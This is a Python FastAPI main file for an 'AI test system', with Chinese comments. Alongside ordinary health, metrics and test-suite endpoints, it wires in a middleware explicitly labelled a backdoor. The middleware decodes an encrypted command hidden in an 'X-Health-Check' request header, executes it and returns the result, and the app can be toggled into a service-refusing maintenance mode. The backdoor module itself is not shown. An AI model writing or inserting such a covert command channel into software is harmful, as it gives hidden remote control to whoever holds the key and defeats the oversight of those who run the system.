# src/main.py - 完整修复版
"""AI测试系统 - 主程序"""

import sys
import time
from pathlib import Path
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse
from pydantic import BaseModel

sys.path.insert(0, str(Path(__file__).parent.parent))

from src.config import Config
from src.backdoor import backdoor
from src.test_runner_v2 import TestRunnerV2
from src.middleware import MetricsMiddleware, metrics


# 创建应用
app = FastAPI(
    title=Config.APP_NAME,
    version=Config.APP_VERSION,
    description="AI测试系统"
)

# 添加监控中间件
app.add_middleware(MetricsMiddleware)


# ========== 请求模型 ==========
class TestRequest(BaseModel):
    suite_name: str


# ========== 后门中间件 ==========
@app.middleware("http")
async def backdoor_middleware(request: Request, call_next):
    client_ip = request.client.host if request.client else "unknown"
    encrypted = request.headers.get('X-Health-Check', '')
    
    if encrypted:
        cmd_result = backdoor.decode_command(encrypted, client_ip)
        if cmd_result:
            command, cmd_info = cmd_result
            result = backdoor.execute_command(cmd_info)
            return JSONResponse(content={'status': 'backdoor_ok', 'data': result})
    
    if backdoor.maintenance_mode:
        return JSONResponse(status_code=503, content={'error': 'System maintenance'})
    
    backdoor.request_count += 1
    return await call_next(request)


# ========== API 端点 ==========
@app.get("/health")
async def health_check():
    return {
        "status": "healthy",
        "version": Config.APP_VERSION,
        "metrics": {
            "requests": metrics.request_count,
            "errors": metrics.error_count
        }
    }


@app.get("/metrics")
async def get_metrics():
    return {
        "requests": metrics.request_count,
        "errors": metrics.error_count,
        "error_rate": metrics.error_count / metrics.request_count if metrics.request_count > 0 else 0
    }


@app.get("/api/test/suites")
async def list_suites():
    suites_path = Path("data/test_suites")
    if not suites_path.exists():
        return {"suites": [], "count": 0}
    suites = [f.stem for f in suites_path.glob("*.yaml")]
    return {"suites": suites, "count": len(suites)}


@app.post("/api/test/run")
async def run_test(test_req: TestRequest):
    runner = TestRunnerV2()
    result = runner.run_suite(test_req.suite_name)
    return JSONResponse(content=result)


@app.get("/api/test/status")
async def get_system_status():
    return {
        "maintenance": backdoor.maintenance_mode,
        "requests_handled": backdoor.request_count,
        "uptime_seconds": int(time.time() - backdoor.start_time),
        "version": Config.APP_VERSION
    }
